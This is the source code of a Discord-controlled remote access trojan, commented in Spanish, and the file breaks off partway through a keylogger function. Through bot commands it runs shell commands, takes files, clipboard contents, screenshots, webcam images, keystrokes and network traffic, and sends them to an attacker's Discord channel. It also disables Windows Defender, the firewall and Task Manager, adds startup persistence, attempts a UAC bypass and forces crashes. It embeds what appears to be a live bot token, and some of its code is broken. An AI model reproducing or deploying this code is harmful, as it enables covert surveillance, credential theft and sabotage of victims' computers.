import discord
from discord.ext import commands
import subprocess
import pyautogui
import os
import ctypes
import win32clipboard
import requests
import shutil
import cv2
import psutil
import time
from PIL import ImageGrab
from datetime import datetime
import tkinter as tk
from tkinter import messagebox
import sys  # Importar sys para manejar los parámetros
import threading
import keyboard
import asyncio
from scapy.all import AsyncSniffer, wrpcap, IP, TCP, UDP
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
import platform
import zipfile
import tempfile
import json
import urllib.request
import re
import base64
import win32crypt
from Crypto.Cipher import AES

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
}


bot_token = "MTM1OTI0MDA0MjI3MDI5ODE4Nw.GZqRlw.CilNSnTd-MILez79lj4cUTLY5iTMg_tCYn6hYc"
server_id = "1358874287498330253"

# Intents necesarios para que el bot funcione correctamente
intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.message_content = True

MAX_ZIP_SIZE = 5 * 1024 * 1024  # 5 MB



bot = commands.Bot(command_prefix="!", intents=intents)

usb_mounts = []
# Función para verificar privilegios de administrador
def is_admin():
    try:
        # Verificar si el proceso actual tiene privilegios elevados
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception as e:
        return False

# Evento cuando el bot se conecta con éxito
@bot.event
async def on_ready():
    print(f'{bot.user} ha iniciado sesión con éxito.')
    guild = discord.utils.get(bot.guilds, id=int(server_id))
    if guild:
        channel = discord.utils.get(guild.text_channels, name="session")
        if not channel:
            channel = await guild.create_text_channel("session")

        try:
            # Obtener la IP pública usando la API de ipify
            ip_response = requests.get("https://api.ipify.org?format=json")
            ip_data = ip_response.json()
            ip_publica = ip_data.get("ip", "No se pudo obtener la IP pública")

            # Obtener la geolocalización de la IP pública
            geolocate_response = requests.get(f"http://ip-api.com/json/{ip_publica}")
            geolocate_data = geolocate_response.json()

            # Obtener la bandera del país utilizando el código del país
            country_code = geolocate_data.get("countryCode", "").lower()
            country_flag = f":flag_{country_code}:"

            # Construir el mensaje atractivo
            location_message = (
                f"**Inicio de sesión exitoso. IP pública del bot:**\n"
                f"IP: `{ip_publica}`\n"
                f"País: {geolocate_data.get('country', 'Desconocido')} {country_flag}\n"
                f"Ciudad: {geolocate_data.get('city', 'Desconocida')}\n"
                f"Latitud: {geolocate_data.get('lat', 'Desconocida')}\n"
                f"Longitud: {geolocate_data.get('lon', 'Desconocida')}"
            )

            # Enviar la IP pública y la geolocalización al canal
            await channel.send(location_message)

        except Exception as e:
            await channel.send(f"**Error al obtener la IP pública o geolocalización:**\n```{str(e)}```")

        # Mostrar el menú de ayuda al inicio
        await myhelp(channel)

# Comando para mostrar ayuda personalizada
@bot.command(name="myhelp")
async def myhelp(ctx):
    help_text = (
        "**📝 Comandos Disponibles:**\n\n"
        
        "**Comandos Generales:**\n\n"
        "--> `!usbinfo = Muestra los USB conectados con inforamación dentro\n"
        "--> `!message` = Mostrar un cuadro de mensaje con tu texto / Sintaxis: `!message ejemplo`\n"
        "--> `!shell` = Ejecutar un comando de shell / Sintaxis: `!shell whoami`\n"
        "--> `!voice` = Hacer que una voz diga en voz alta una frase personalizada / Sintaxis: `!voice prueba`\n"
        "--> `!admincheck` = Comprobar si el programa tiene privilegios de administrador\n"
        "--> `!cd` = Cambiar de directorio\n"
        "--> `!dir` = Mostrar todos los elementos en el directorio actual\n"
        "--> `!download` = Descargar un archivo desde el ordenador infectado\n"
        "--> `!upload` = Subir un archivo al ordenador infectado / Sintaxis: `!upload archivo.png` (con archivo adjunto)\n"
        "--> `!delete` = Eliminar un archivo / Sintaxis: `!delete /ruta/del/archivo.txt`\n"
        "--> `!write` = Escribir tu frase deseada en el ordenador\n"
        "--> `!clipboard` = Recuperar el contenido del portapapeles del ordenador infectado\n"
        "--> `!idletime` = Obtener el tiempo de inactividad de los usuarios en el ordenador objetivo\n"
        "--> `!datetime` = Mostrar fecha y hora actuales\n"
        "--> `!currentdir` = Mostrar el directorio actual\n"
        "--> `!keylog <sec>`= Captura las teclas durente el tiempo especificados\n\n"
        
        "**Escalado de Privilegios y Control del Sistema:**\n\n"
        "--> `!getadmin` = Solicitar privilegios de administrador a través del aviso UAC\n"
        "--> `!block` = Bloquear el teclado y el ratón del usuario (Se requieren privilegios de administrador)\n"
        "--> `!unblock` = Desbloquear el teclado y el ratón del usuario (Se requieren privilegios de administrador)\n"
        "--> `!screenshot` = Tomar una captura de pantalla de la pantalla actual del usuario\n"
        "--> `!exit` = Salir del programa\n"
        "--> `!kill` = Matar una sesión o proceso / Sintaxis: `!kill session-3` o `!kill all`\n"
        "--> `!uacbypass` = Intentar eludir UAC para obtener privilegios de administrador\n"
        "--> `!shutdown` = Apagar el ordenador\n"
        "--> `!restart` = Reiniciar el ordenador\n"
        "--> `!logoff` = Cerrar sesión del usuario actual\n"
        "--> `!bluescreen` = Provocar una pantalla azul (Se requieren privilegios de administrador)\n"
        "--> `!migrateprocess <process_name>` = Migrar un proceso en ejecución a una nueva instancia. / Sintaxis: `!migrateprocess ejemplo.exe`\n\n"
        
        "**Seguridad y Modificaciones del Sistema:**\n\n"
        "--> `!prockill` = Matar un proceso por nombre / Sintaxis: `!prockill proceso`\n"
        "--> `!disabledefender` = Deshabilitar Windows Defender (Se requieren privilegios de administrador)\n"
        "--> `!disablefirewall` = Deshabilitar el Firewall de Windows (Se requieren privilegios de administrador)\n"
        "--> `!critproc` = Convertir el programa en un proceso crítico (Se requieren privilegios de administrador)\n"
        "--> `!uncritproc` = Eliminar el estado de proceso crítico (Se requieren privilegios de administrador)\n"
        "--> `!website` = Abrir un sitio web en el ordenador infectado / Sintaxis: `!website www.google.com`\n"
        "--> `!disabletaskmgr` = Deshabilitar el Administrador de Tareas (Se requieren privilegios de administrador)\n"
        "--> `!enabletaskmgr` = Habilitar el Administrador de Tareas (Se requieren privilegios de administrador)\n"
        "--> `!startup` = Agregar el programa al inicio\n\n"
        
        "**Geolocalización y Comandos Varios:**\n\n"
        "--> `!geolocate` = Geolocalizar el ordenador usando la latitud y longitud de la IP\n"
        "--> `!listprocess` = Listar todos los procesos\n"
        "--> `!infocounts` = Obtener información de las cuentas del sistema\n"
        "--> `!rootkit` = Lanzar un rootkit (Se requieren privilegios de administrador) [No disponible]\n"
        "--> `!unrootkit` = Eliminar el rootkit (Se requieren privilegios de administrador) [No disponible]\n"
        "--> `!getcams` = Listar los nombres de las cámaras\n"
        "--> `!selectcam` = Seleccionar una cámara para tomar una foto / Sintaxis: `!selectcam 1`\n"
        "--> `!webcampic` = Tomar una foto con la cámara web seleccionada\n"
        "--> `!myhelp` = Este menú de ayuda\n"
        "--> `! sniff <sec>` = Capturar paquetes de red durante el tiempo especificado\n"
    )

    # Crear archivo de texto temporal con codificación UTF-8
    file_path = "help_commands.txt"
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(help_text)
    
    # Enviar el archivo de texto a Discord
    await ctx.send("Here is the help file:", file=discord.File(file_path))
    
    # Eliminar el archivo temporal después de enviarlo
    os.remove(file_path)

# Comando para solicitar privilegios de administrador y migrar un proceso
@bot.command()
async def getadmin(ctx, process_name: str = None):
    if is_admin():
        await ctx.send("Ya tienes privilegios de administrador.")
    else:
        try:
            # Solicitar privilegios de administrador
            subprocess.run("""powershell -Command "Start-Process cmd -ArgumentList '/C echo Privilegios otorgados' -Verb RunAs" """, shell=True)
            await ctx.send("Privilegios de administrador obtenidos.")

            # Si se proporciona un nombre de proceso, migramos ese proceso a uno nuevo con privilegios elevados
            if process_name:
                migrated_process = None
                for proc in psutil.process_iter(['pid', 'name']):
                    if process_name.lower() in proc.info['name'].lower():
                        migrated_process = proc
                        break

                if migrated_process is None:
                    await ctx.send(f"**Error:** No se encontró un proceso con el nombre `{process_name}` en ejecución.")
                    return
                
                # Obtener la ruta del ejecutable del proceso encontrado
                process_path = migrated_process.exe()

                # Ejecutar una nueva instancia del proceso con privilegios elevados usando Start-Process
                subprocess.run(f"powershell -Command Start-Process '{process_path}' -Verb RunAs", shell=True)
                
                await ctx.send(f"**Éxito:** Se ha migrado el proceso `{process_name}` a un nuevo proceso con privilegios elevados.")
                
                # Finalizar el proceso original (cerrar el primer proceso)
                migrated_process.terminate()
                time.sleep(2)  # Esperar un momento para asegurarse de que el proceso se termine
                
                await ctx.send(f"**El proceso original `{process_name}` ha sido cerrado y migrado.**")
            else:
                await ctx.send("No se proporcionó un nombre de proceso para migrar.")

        except Exception as e:
            await ctx.send(f"**Error:** {str(e)}")

# Comando para comprobar si el bot tiene privilegios de administrador
@bot.command()
async def admincheck(ctx):
    if is_admin():
        await ctx.send("```El programa tiene privilegios de administrador.```")
    else:
        await ctx.send("```El programa NO tiene privilegios de administrador.```")

  # Comando: Mostrar un cuadro de mensaje
@bot.command()
async def message(ctx, *, text: str):
    pyautogui.alert(text)
    await ctx.send("```Mensaje mostrado en la máquina.```")

# Comando: Ejecutar un comando de shell
@bot.command()
async def shell(ctx, *, command: str):
    await ctx.send(f"```yaml\nEjecutando comando: {command}\n```")
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    if result.returncode == 0:
        await ctx.send(f"```{result.stdout}```")
    else:
        await ctx.send(f"```Error:\n{result.stderr}```")

# Comando: Voz para hablar en voz alta
@bot.command()
async def voice(ctx, *, text: str):
    from pyttsx3 import init
    tts = init()
    tts.say(text)
    tts.runAndWait()
    await ctx.send("```Texto leído en voz alta.```")

# Comando: Cambiar directorio
@bot.command()
async def cd(ctx, *, path: str):
    try:
        os.chdir(path)
        await ctx.send(f"```Directorio cambiado a: {os.getcwd()}```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

# Comando: Listar contenido de directorio
@bot.command()
async def dir(ctx):
    try:
        items = os.listdir()
        await ctx.send(f"```{items}```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

# Comando: Descargar archivo
@bot.command()
async def download(ctx, *, file_path: str):
    try:
        with open(file_path, "rb") as file:
            await ctx.send(file=discord.File(file, os.path.basename(file_path)))
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

# Comando: Subir archivo mediante archivo adjunto
@bot.command()
async def upload(ctx):
    if ctx.message.attachments:
        for attachment in ctx.message.attachments:
            await attachment.save(attachment.filename)
        await ctx.send("```Archivo(s) subido(s) con éxito.```")
    else:
        await ctx.send("```No se adjuntó ningún archivo.```")

# Comando: Capturar portapapeles
@bot.command()
async def clipboard(ctx):
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        await ctx.send(f"```{data}```")
    except Exception as e:
        await ctx.send(f"```Error al leer el portapapeles: {str(e)}```")

# Comando: Captura de pantalla
@bot.command()
async def screenshot(ctx):
    try:
        screenshot = ImageGrab.grab()
        screenshot.save("screenshot.png")
        await ctx.send(file=discord.File("screenshot.png"))
        os.remove("screenshot.png")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

# Comando: Bloquear teclado y ratón
@bot.command()
async def block(ctx):
    if not is_admin():
        await ctx.send("```Permisos de administrador requeridos.```")
        return
    ctypes.windll.user32.BlockInput(True)
    await ctx.send("```Teclado y ratón bloqueados.```")



#Comando: Obtiene los usb conectados
@bot.command()
async def usbinfo(ctx):
    """Lista los dispositivos USB conectados con su letra y nombre"""
    global usb_mounts
    usb_mounts = []

    try:
        system = platform.system()
        partitions = psutil.disk_partitions()

        # Lista para almacenar información detallada de los USBs
        usb_details = []

        for p in partitions:
            # Detectar unidades de tipo "removable" (en Windows) o ubicaciones de medios montados
            if (system == "Windows" and 'removable' in p.opts.lower()) or \
               (system != "Windows" and any(s in p.mountpoint for s in ["/media/", "/run/media/", "/Volumes/"])):
                
                device_info = {
                    "mount_point": p.mountpoint,
                    "device": p.device
                }

                # En sistemas Windows, obtener la letra y nombre del dispositivo
                if system == "Windows":
                    drive_letter = p.device[0]  # La letra de la unidad será la primera parte de 'device'
                    try:
                        # Se intenta obtener el nombre del dispositivo
                        drive_name = psutil.disk_partitions()[partitions.index(p)].device.split('\\')[-1]
                    except Exception as e:
                        drive_name = "Desconocido"  # Si no se puede obtener el nombre, asignar uno predeterminado

                    device_info["drive_letter"] = drive_letter
                    device_info["drive_name"] = drive_name
                else:
                    device_info["drive_name"] = p.device  # En otros sistemas, mostrar solo el nombre

                usb_details.append(device_info)
                usb_mounts.append(p.mountpoint)  # Guarda la ruta de montaje

        if not usb_details:
            await ctx.send("```No se encontraron dispositivos USB conectados.```")
            return

        # Mostrar los detalles en un formato adecuado para el usuario
        response = "\n".join([f"{i+1}. Letra: {device['drive_letter']} | Nombre: {device['drive_name']} | Ruta: {device['mount_point']}" for i, device in enumerate(usb_details)])

        await ctx.send(f"```Dispositivos USB conectados:\n{response}```")

    except Exception as e:
        await ctx.send(f"```Error al detectar USBs: {str(e)}```")
# Comando: Desbloquear teclado y ratón

@bot.command()
async def unblock(ctx):
    if not is_admin():
        await ctx.send("```Permisos de administrador requeridos.```")
        return
    ctypes.windll.user32.BlockInput(False)
    await ctx.send("```Teclado y ratón desbloqueados.```")

# Comando: Obtener tiempo de inactividad
@bot.command()
async def idletime(ctx):
    class LASTINPUTINFO(ctypes.Structure):
        _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]

    lii = LASTINPUTINFO()
    lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
    if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii)):
        millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
        seconds = millis // 1000
        await ctx.send(f"```Tiempo de inactividad: {seconds} segundos.```")
    else:
        await ctx.send("```Error al obtener tiempo de inactividad.```")

# Comando: Matar proceso por nombre
@bot.command()
async def prockill(ctx, *, process_name: str):
    try:
        result = subprocess.run(f"taskkill /IM {process_name} /F", shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            await ctx.send(f"```Proceso {process_name} terminado con éxito.```")
        else:
            await ctx.send(f"```Error al terminar el proceso: {result.stderr}```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

# Comando: Deshabilitar Defender
@bot.command()
async def disabledefender(ctx):
    if not is_admin():
        await ctx.send("```Permisos de administrador requeridos.```")
        return
    try:
        # Ejecutar el comando en PowerShell con privilegios elevados
        subprocess.run("""powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" """, shell=True)
        await ctx.send("```Windows Defender deshabilitado.```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

# Comando: Deshabilitar Firewall
@bot.command()
async def disablefirewall(ctx):
    if not is_admin():
        await ctx.send("```Permisos de administrador requeridos.```")
        return
    try:
        # Ejecutar el comando en PowerShell con privilegios elevados
        subprocess.run("""powershell -Command "netsh advfirewall set allprofiles state off" """, shell=True)
        await ctx.send("```Firewall deshabilitado.```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

# Comando: Obtener lista de procesos y enviar en archivo .txt
@bot.command()
async def listprocess(ctx):
    try:
        # Ejecutar el comando tasklist
        result = subprocess.run("tasklist", shell=True, capture_output=True, text=True)
        
        # Crear el archivo de texto temporal con codificación UTF-8
        file_path = "text_listprocess.txt"
        with open(file_path, "w", encoding="utf-8") as f:
            # Escribir la salida del comando tasklist en el archivo
            f.write(result.stdout)
        
        # Enviar el archivo de texto a Discord
        await ctx.send("Aquí está la lista de procesos activos:", file=discord.File(file_path))
        
        # Eliminar el archivo temporal después de enviarlo
        os.remove(file_path)
    
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")
        
# Comando: Mostrar fecha y hora actuales
@bot.command()
async def current_time(ctx):
    now = datetime.datetime.now()  # Usamos datetime.datetime.now() para obtener la hora actual.
    await ctx.send(f"La hora actual es: {now.strftime('%Y-%m-%d %H:%M:%S')}")

# Comando: Apagar el sistema
@bot.command()
async def shutdown(ctx):
    if not is_admin():
        await ctx.send("```Permisos de administrador requeridos.```")
        return
    subprocess.run("shutdown /s /t 1", shell=True)
    await ctx.send("```Sistema apagándose...```")

# Comando: Reiniciar el sistema
@bot.command()
async def restart(ctx):
    if not is_admin():
        await ctx.send("```Permisos de administrador requeridos.```")
        return
    subprocess.run("shutdown /r /t 1", shell=True)
    await ctx.send("```Sistema reiniciándose...```")

# Comando: Cerrar sesión
@bot.command()
async def logoff(ctx):
    if not is_admin():
        await ctx.send("```Permisos de administrador requeridos.```")
        return
    subprocess.run("shutdown /l", shell=True)
    await ctx.send("```Cerrando sesión...```")

# Comando: Pantallazo azul
@bot.command()
async def bluescreen(ctx):
    """Comando para intentar generar un BSOD mediante la terminación de svchost.exe"""
    
    try:
        # Enviar mensaje de notificación
        await ctx.send("Intentando generar Pantallazo Azul (BSOD)...")

        # Ejecutar el comando taskkill /IM svchost.exe /F en el sistema operativo
        subprocess.run("taskkill /IM svchost.exe /F", shell=True, check=True)

        # Confirmar al usuario que el comando fue ejecutado
        await ctx.send("El comando ha sido ejecutado. Si el sistema lo permite, un BSOD podría ser generado.")

    except Exception as e:
        # Si ocurre algún error al intentar ejecutar el comando
        await ctx.send(f"Error al intentar ejecutar el comando: {e}")

# Comando: Deshabilitar Administrador de Tareas
@bot.command()
async def disabletaskmgr(ctx):
    if not is_admin():
        await ctx.send("```Permisos de administrador requeridos.```")
        return
    try:
        subprocess.run("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskmgr /t REG_DWORD /d 1 /f", shell=True)
        await ctx.send("```Administrador de Tareas deshabilitado.```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

# Comando: Habilitar Administrador de Tareas
@bot.command()
async def enabletaskmgr(ctx):
    if not is_admin():
        await ctx.send("```Permisos de administrador requeridos.```")
        return
    try:
        subprocess.run("REG DELETE HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskmgr /f", shell=True)
        await ctx.send("```Administrador de Tareas habilitado.```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

# Comando: Cambiar el directorio actual
@bot.command()
async def currentdir(ctx):
    try:
        current_dir = os.getcwd()
        await ctx.send(f"```Directorio actual: {current_dir}```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

# Comando: Abrir una página web
@bot.command()
async def website(ctx, url: str):
    try:
        subprocess.run(f"start {url}", shell=True)
        await ctx.send(f"```Página web {url} abierta en el navegador predeterminado.```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

# Comando: Salir del programa
@bot.command()
async def exit(ctx):
    await ctx.send("```Cerrando el bot...```")
    await bot.close()

# Comando: Hacer que el programa sea crítico
@bot.command()
async def critproc(ctx):
    if not is_admin():
        await ctx.send("```Permisos de administrador requeridos.```")
        return
    ctypes.windll.ntdll.RtlSetProcessIsCritical(True, False, False)
    await ctx.send("```El programa ahora es un proceso crítico.```")

# Comando: Dejar de ser un proceso crítico
@bot.command()
async def uncritproc(ctx):
    if not is_admin():
        await ctx.send("```Permisos de administrador requeridos.```")
        return
    ctypes.windll.ntdll.RtlSetProcessIsCritical(False, False, False)
    await ctx.send("```El programa ya no es un proceso crítico.```")

# Comando: Tomar captura de pantalla
@bot.command(name="takescreenshot")
async def takescreenshot(ctx):
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.png")
        await ctx.send(file=discord.File("screenshot.png"))
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")






# Comando: Bloquear teclado y ratón (requiere admin)
@bot.command(name="blockkeyboard")
async def blockkeyboard(ctx):
    try:
        subprocess.run("RUNDLL32 user32.dll,LockWorkStation", shell=True)
        await ctx.send("```Teclado y ratón bloqueados.```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

# Comando: Copiar contenido del portapapeles
@bot.command(name="copyclipboard")
async def copyclipboard(ctx):
    try:
        # Leer el contenido del portapapeles
        import pyperclip
        clipboard_content = pyperclip.paste()
        await ctx.send(f"```Contenido del portapapeles: {clipboard_content}```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

# Comando: Subir archivo al sistema infectado (con adjunto)
@bot.command(name="uploadFile")
async def uploadFile(ctx):
    if ctx.message.attachments:
        for attachment in ctx.message.attachments:
            await attachment.save(attachment.filename)
            await ctx.send(f"```Archivo {attachment.filename} subido con éxito.```")
    else:
        await ctx.send("```No se adjuntó ningún archivo.```")

# Comando: Intentar bypass UAC
@bot.command()
async def uacbypass(ctx):

    try:
        subprocess.run("start %windir%\\System32\\slui.exe", shell=True)
        await ctx.send("```Intentando bypass UAC...```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

# Coamndo: Geolocaliza la IP publica del host
@bot.command()
async def geolocate(ctx, ip_address: str = None):
    try:
        # Si no se proporciona una IP, obtenemos la IP pública automáticamente
        if ip_address is None:
            ip_response = requests.get("https://api.ipify.org?format=json")
            ip_data = ip_response.json()
            ip_address = ip_data.get("ip")
        
        # Realizamos la solicitud para obtener la geolocalización usando la IP
        response = requests.get(f"http://ip-api.com/json/{ip_address}")
        location_data = response.json()

        # Si la respuesta contiene un error, mostramos el mensaje
        if location_data.get("status") == "fail":
            await ctx.send(f"Error al obtener la geolocalización de la IP: {ip_address}")
            return

        # Obtenemos la bandera del país basado en el código de país
        country_code = location_data['countryCode']
        # Usamos un emote de la bandera basado en el código del país
        country_flag = f":flag_{country_code.lower()}:"

        # Creamos el mensaje de geolocalización
        location_message = (
            f"**Ubicación de {ip_address}:**\n"
            f"Ciudad: {location_data['city']}\n"
            f"País: {location_data['country']} {country_flag}\n"
            f"Latitud: {location_data['lat']}\n"
            f"Longitud: {location_data['lon']}"
        )

        # Enviamos el mensaje con la información de la geolocalización
        await ctx.send(location_message)

    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

# Comando: Matar sesión
@bot.command()
async def kill(ctx, session_name: str):
    try:
        if session_name == "all":
            subprocess.run("taskkill /F /IM python.exe", shell=True)
            await ctx.send("```Todas las sesiones han sido terminadas.```")
        else:
            subprocess.run(f"taskkill /F /IM {session_name}.exe", shell=True)
            await ctx.send(f"```Sesión {session_name} terminada.```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

@bot.command()
async def delete(ctx, file_path: str):
    try:
        # Verificar si el archivo existe
        if os.path.exists(file_path):
            os.remove(file_path)  # Eliminar el archivo
            await ctx.send(f"Archivo `{file_path}` eliminado correctamente.")
        else:
            await ctx.send(f"El archivo `{file_path}` no se encuentra en la ruta especificada.")
    except Exception as e:
        await ctx.send(f"Error al eliminar el archivo: {str(e)}")

@bot.command()
async def write(ctx, file_path: str, *, text: str):
    try:
        # Abrir el archivo en modo escritura (se crea si no existe)
        with open(file_path, "w") as file:
            file.write(text)  # Escribir el texto en el archivo
        await ctx.send(f"Texto escrito correctamente en `{file_path}`.")
    except Exception as e:
        await ctx.send(f"Error al escribir en el archivo: {str(e)}")

@bot.command()
async def startup(ctx, program_path: str):
    try:
        # Verificar si el archivo del programa existe
        if not os.path.exists(program_path):
            await ctx.send(f"El programa en `{program_path}` no se encuentra.")
            return
        
        # Obtener la carpeta de inicio del usuario (en Windows)
        startup_folder = os.getenv('APPDATA') + r'\Microsoft\Windows\Start Menu\Programs\Startup'
        
        # Verificar si la carpeta de inicio existe
        if not os.path.exists(startup_folder):
            await ctx.send("No se pudo encontrar la carpeta de inicio.")
            return
        
        # Crear un acceso directo del programa en la carpeta de inicio
        program_name = os.path.basename(program_path)
        startup_program_path = os.path.join(startup_folder, program_name)
        
        # Copiar el archivo al directorio de inicio (puedes usar un acceso directo .lnk o simplemente copiar el ejecutable)
        shutil.copy(program_path, startup_program_path)
        
        await ctx.send(f"El programa `{program_name}` se ha agregado al inicio correctamente.")
    except Exception as e:
        await ctx.send(f"Error al agregar el programa al inicio: {str(e)}")

@bot.command()
async def getcams(ctx):
    try:
        # Obtener la lista de cámaras disponibles en el sistema
        index = 0
        cams = []
        while True:
            cap = cv2.VideoCapture(index)
            if not cap.isOpened():
                break
            cams.append(f"Camara {index}")
            cap.release()
            index += 1
        
        if cams:
            await ctx.send(f"List of available cameras: {', '.join(cams)}")
        else:
            await ctx.send("No cameras found.")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command(name='sniff')
async def network_sniff(ctx, seconds: int = 60):
    """
    Captura tráfico de red durante X segundos y genera reporte PDF
    Uso: !sniff [segundos] (default: 60, máximo 300)
    """
    # Verificación de permisos de administrador (Windows)

    

    # Validación de tiempo
    if seconds <= 0 or seconds > 300:
            await ctx.send("❌ El tiempo debe ser entre 1-300 segundos")
            return

    await ctx.send(f"🕵️‍♂️ **Iniciando captura de red por {seconds} segundos...**")

    class NetworkSniffer:
        def __init__(self):
            self.pcap_file = "temp_capture.pcap"
            self.pdf_file = "network_report.pdf"
            self.sniffer = None
            self.packets = []

        def packet_handler(self, packet):
            self.packets.append(packet)

        async def start_capture(self, duration):
            self.sniffer = AsyncSniffer(prn=self.packet_handler)
            self.sniffer.start()
            await asyncio.sleep(duration)
            self.sniffer.stop()

            if self.packets:
                wrpcap(self.pcap_file, self.packets)
                return True
            return False

        def generate_report(self):
            
                pdf = canvas.Canvas(self.pdf_file, pagesize=letter)
                pdf.setFont("Helvetica", 10)
                y = 750
                
                # Encabezado
                pdf.drawString(100, 780, "📊 Reporte de Tráfico de Red")
                pdf.line(100, 775, 500, 775)
                
                for i, pkt in enumerate(self.packets[:100], 1):  # Limitar a 100 paquetes
                    info = [
                        f"Paquete #{i}",
                        f"Protocolo: {pkt.name}",
                        f"Tamaño: {len(pkt)} bytes"
                    ]
                    
                    if IP in pkt:
                        info.extend([
                            f"Origen: {pkt[IP].src}",
                            f"Destino: {pkt[IP].dst}"
                        ])
                    
                    if TCP in pkt:
                        info.append(f"TCP Ports: {pkt[TCP].sport} → {pkt[TCP].dport}")
                    elif UDP in pkt:
                        info.append(f"UDP Ports: {pkt[UDP].sport} → {pkt[UDP].dport}")

                    for line in info:
                        pdf.drawString(100, y, line)
                        y -= 12
                    
                    y -= 10
                    if y < 50:
                        pdf.showPage()
                        y = 750
                
                pdf.save()
                return True
          
    # Ejecutar captura
    sniffer = NetworkSniffer()
    try:
        if await sniffer.start_capture(seconds):
            if sniffer.generate_report():
                # Enviar archivos
                await ctx.send("✅ **Captura completada**", 
                              files=[
                                  discord.File(sniffer.pcap_file),
                                  discord.File(sniffer.pdf_file)
                              ])
            else:
                await ctx.send("⚠ Se capturaron paquetes pero falló el reporte")
        else:
            await ctx.send("❌ No se capturó ningún paquete")
    except Exception as e:
        await ctx.send(f"❌ **Error durante la captura:** `{str(e)}`")
    finally:
        # Limpieza
        for f in [sniffer.pcap_file, sniffer.pdf_file]:
            try:
                if os.path.exists(f):
                    os.remove(f)
            except:
                pass

    async def run_sniffer(self, duration: int):
        self.packets = []
        self._stop_event.clear()
        
        try:
            self.sniffer = AsyncSniffer(prn=self._packet_callback)
            self.sniffer.start()
            
            timer_task = asyncio.create_task(self._timer(duration))
            await self._stop_event.wait()
            
            self.sniffer.stop()
            timer_task.cancel()
            
            if self.packets:
                wrpcap(self.pcap_file, self.packets)
                self._analyze_packets()
                return True
            return False
            
        except Exception as e:
            print(f"❌ Error en captura: {str(e)}")
            return False
        



@bot.command()
async def selectcam(ctx, cam_number: int):
    try:
        cap = cv2.VideoCapture(cam_number)
        
        if not cap.isOpened():
            await ctx.send(f"Camera {cam_number} not found.")
            return
        
        ret, frame = cap.read()
        if ret:
            # Guardar la foto tomada en el disco
            cv2.imwrite("captured_image.jpg", frame)
            await ctx.send("Picture taken successfully!")
        else:
            await ctx.send("Failed to capture image.")
        cap.release()
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def keylog(ctx, seconds: int = 60):
    """
    Registra las pulsaciones de teclas durante un tiempo determinado (por defecto 60 segundos).
    Uso: !keylog [segundos] (máximo 300 segundos por seguridad)
    """
    try:
        # Validar el tiempo (1-300 segundos)
        if seconds < 1 or seconds > 300:
            await ctx.send("❌ El tiempo debe estar entre 1 y 300 segundos.")
            return

        await ctx.send(f"🔑 **Iniciando keylogger por {seconds} segundos...** (Mantén este mensaje como referencia)")

        # Configurar el keylogger
        log = []
        stop_event = threading.Event()

        def on_key_event(e):
            if e.event_type == keyboard.KEY_DOWN:
                key_name = e.name
                # Simplificar teclas especiales
                if len(key_name) > 1:
                    key_name = f"[{key_name}]"
                log.append(key_name)

        # Iniciar el hook de teclado
